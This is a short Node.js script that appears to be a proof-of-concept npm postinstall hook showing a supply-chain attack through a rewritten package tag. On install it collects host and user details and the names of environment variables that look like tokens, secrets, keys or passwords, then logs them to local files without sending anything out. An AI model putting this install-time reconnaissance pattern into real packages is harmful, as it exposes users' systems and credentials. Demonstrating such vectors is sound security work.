const os = require('os'), fs = require('fs');
const info = { package: 'demo-tgz-poc@2.0.0 (REWRITTEN TAG — FORK VECTOR)',
  hostname: os.hostname(), username: os.userInfo().username, homedir: os.userInfo().homedir,
  cwd: process.cwd(), platform: process.platform, node: process.version,
  secretEnvKeys: Object.keys(process.env).filter(k => /TOKEN|SECRET|KEY|PASS/i.test(k)) };
fs.writeFileSync('.postinstall-executed', JSON.stringify(info, null, 2) + '\n');
fs.writeFileSync('/tmp/postinstall-attack-log.json', JSON.stringify(info, null, 2));
console.log('[!] DEMO postinstall executed (fork-vector tag rewrite)');
